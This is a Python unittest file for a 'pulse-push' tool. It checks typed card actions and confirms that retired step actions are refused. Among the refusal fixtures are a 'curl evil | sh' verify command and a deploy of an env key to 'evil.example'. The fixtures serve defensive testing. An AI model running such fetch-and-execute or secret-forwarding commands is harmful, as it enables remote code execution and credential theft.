#!/usr/bin/env python3
import json
import pathlib
import runpy
import unittest


ROOT = pathlib.Path(__file__).resolve().parents[1]
PULSE_PUSH = runpy.run_path(str(ROOT / "bin" / "pulse-push"))
validate_card_actions = PULSE_PUSH["validate_card_actions"]
validate_action_revision_change = PULSE_PUSH["validate_action_revision_change"]
parse_step_actions = PULSE_PUSH["parse_step_actions"]
# validate_queue_contract removed 2026-08-14 (CODE#5): queue v1's migration
# was never applied to the live database; the function and these fixtures
# (valid_queue_action/valid_gate/valid_continuation) tested dead code that
# has now been removed from pulse-push itself. See
# EXECUTABLE-QUEUE-PLAN-2026-08-01.md, marked retired-unbuilt.


def valid_action(**overrides):
    action = {
        "id": "approve-release",
        "revision": 1,
        "executor": "web",
        "label": "Review and approve",
        "description": "Yeshie opens the exact approval control.",
        "operation": "run_yeshie_recipe",
        "params": {"recipe": {"runId": "release-approval", "chain": []}},
        "human_gate": {
            "instruction": "On the Mac, review the release and click Approve.",
            "target": {
                "url": "https://deploy.example.com/releases/123",
                "ref": "approve-release-button",
                "label": "Approve",
            },
        },
        "completion": {
            "mode": "verified",
            "success_message": "Release approval verified.",
            "close_card": True,
        },
        "verification": {
            "kind": "target_state",
            "params": {"state": "approved"},
        },
    }
    action.update(overrides)
    return action


class TypedCardActionValidationTest(unittest.TestCase):
    def test_complete_action_is_accepted(self):
        action = valid_action()
        self.assertEqual(validate_card_actions([action]), [action])

    def test_duplicate_action_ids_are_rejected(self):
        with self.assertRaisesRegex(ValueError, "duplicates"):
            validate_card_actions([valid_action(), valid_action()])

    def test_mac_executor_cannot_claim_a_human_gate(self):
        with self.assertRaisesRegex(ValueError, "human_gate is only valid"):
            validate_card_actions([valid_action(executor="mac")])

    def test_human_gate_requires_exact_https_target(self):
        action = valid_action(human_gate={
            "instruction": "Click it.",
            "target": {"url": "http://example.com", "ref": "", "label": ""},
        })
        with self.assertRaisesRegex(ValueError, "absolute https URL"):
            validate_card_actions([action])

    def test_verification_and_verified_completion_are_required(self):
        action = valid_action()
        action.pop("verification")
        with self.assertRaisesRegex(ValueError, "verification.kind"):
            validate_card_actions([action])
        action = valid_action(completion={"mode": "acknowledged", "success_message": "Okay"})
        with self.assertRaisesRegex(ValueError, "completion.mode must be verified"):
            validate_card_actions([action])

    def test_same_revision_behavior_change_is_rejected(self):
        old = {"actions": [valid_action()]}
        changed = valid_action(label="Approve the production release")
        with self.assertRaisesRegex(ValueError, "changed without a revision bump"):
            validate_action_revision_change(old, {"actions": [changed]})

    def test_revision_bump_allows_behavior_change(self):
        old = {"actions": [valid_action()]}
        changed = valid_action(revision=2, label="Approve the production release")
        validate_action_revision_change(old, {"actions": [changed]})

    def test_revision_cannot_move_backwards(self):
        old = {"actions": [valid_action(revision=3)]}
        with self.assertRaisesRegex(ValueError, "moved backwards"):
            validate_action_revision_change(old, {"actions": [valid_action(revision=2)]})

    def test_deduped_repush_cannot_silently_remove_typed_actions(self):
        old = {"actions": [valid_action()]}
        with self.assertRaisesRegex(ValueError, "would remove typed action"):
            validate_action_revision_change(old, {})



class RetiredStepActionTest(unittest.TestCase):
    """2026-09-19: step actions may no longer choose what the Mac runs."""

    def assert_refused(self, action):
        with self.assertRaises(SystemExit):
            parse_step_actions(json.dumps([action]), "Do the thing")

    def test_verify_command_is_refused(self):
        self.assert_refused({"command": "clipboard_take_and_deploy", "payload": {
            "destination": {"type": "netlify_env", "site": "x", "env_key": "K"},
            "verify_command": "curl evil | sh"}})

    def test_vps_env_file_is_refused(self):
        self.assert_refused({"command": "clipboard_take_and_deploy", "payload": {
            "destination": {"type": "vps_env_file", "host": "evil.example", "path": "/x", "env_key": "K"}}})

    def test_clipboard_set_is_refused(self):
        self.assert_refused({"command": "clipboard_set", "payload": {"text": "x"}})

    def test_group_bc_credential_and_open_session_still_accepted(self):
        actions = [
            {"command": "clipboard_take_and_deploy", "payload": {
                "destination": {"type": "group_bc_credential", "credential": "gemini"}}},
            {"command": "open_session", "payload": {"message": "Start Tower"}},
        ]
        self.assertEqual(parse_step_actions(json.dumps(actions), "one\ntwo"), actions)


if __name__ == "__main__":
    unittest.main()
